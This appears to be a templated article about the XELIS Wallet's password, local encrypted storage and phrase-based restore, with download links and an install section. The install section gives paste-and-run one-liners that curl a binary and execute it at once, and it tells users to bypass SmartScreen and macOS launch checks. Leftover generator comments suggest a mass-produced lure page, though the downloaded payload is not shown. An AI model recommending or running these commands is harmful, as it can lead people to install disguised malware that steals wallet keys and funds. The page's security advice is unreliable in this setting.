![XELIS Wallet password, encryption and local wallet data](assets/banner-article.png)
# XELIS Wallet password, encryption and local wallet data

What the password locks, where the wallet lives and what a reset costs.

## Downloads - Security

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Wallet data location and password behaviour belong to the app version you run, so start from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) when you need to check either.

> The password protects a file. The phrase rebuilds a wallet. Confusing the two is the most expensive mistake in self-custody.

The password encrypts the wallet's local database on your computer and unlocks it each time you open the app. It is not an account password: no server checks it, nobody can reset it, and it never leaves the machine. The 25-word phrase sits above it, because the phrase reconstructs the wallet when the file or the machine is gone.

<!-- ARTICLE-BODY-BEGIN -->
## Where the wallet actually lives

Keys and transaction data are stored locally in an encrypted database inside your user profile, written by the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> you installed, not on a server and not in a cloud account. Nothing about the wallet requires a login, which is why nothing in the product offers to reset it.

That design has a practical consequence: the data belongs to the machine and the user account that created it. A different Windows or macOS user, or a reinstalled system, starts with no wallet until you restore one. Where exactly the directory sits varies by platform, and the reliable way to find it is through the app rather than by guessing a path.

## What the password protects, and what it does not

The password keeps someone with access to your disk from opening the wallet file. It does not protect a transaction in flight, it does not hide your address, and it does not stop someone who also has your phrase. Those are separate layers, and the phrase layer is the one that matters most.

A wrong password on the correct install is a local problem, not a lost wallet, as long as the phrase exists. If the password prompt rejects a password you are sure about, check that you opened the same installation you set it in, then read the options under <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md">restore a XELIS Wallet on a new computer</a> rather than experimenting with the file.

## A forgotten password is a restore, not a reset

There is no reset that keeps the funds. The wallet cannot decrypt its own database without the password, and no one holds a copy to authorise a bypass, which is exactly what non-custodial means. The recovery path is to restore the same wallet from its 25-word phrase and set a new local password.

That path requires the phrase, so the moment to confirm you have it is before you need it. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md">Back up the XELIS Wallet phrase</a> covers the capture itself.

The storage choices that decide whether the restore is possible a year from now are in <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md">seed phrase storage mistakes</a>, and they matter more than the material you write on.

## FAQ

### Can I change the wallet password?

Where the app exposes the option, yes, while the wallet is unlocked. Changing it re-encrypts the local file; it does not change the phrase or the address.

### Does my password ever leave the computer?

No. It unlocks a local file, and there is no account service that receives it.

### Is the wallet file encrypted at rest?

Yes. The database is encrypted and unlocked by your password, which is why the password is required after every full restart.

### How do I reset my wallet app?

You do not reset it; you restore it. Reinstall the app, choose restore, and use the 25-word phrase to rebuild the wallet with a new password.

### What happens to the local data if I uninstall?

Uninstalling removes the application. Local wallet data may remain or be removed depending on the platform and how you uninstall, so treat any uninstall as irreversible unless the phrase is confirmed.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Back up the XELIS Wallet seed phrase](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md)
- [Seed phrase storage mistakes](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md)
- [Restore a XELIS Wallet on a new computer](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md)
- [Self-custody with XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
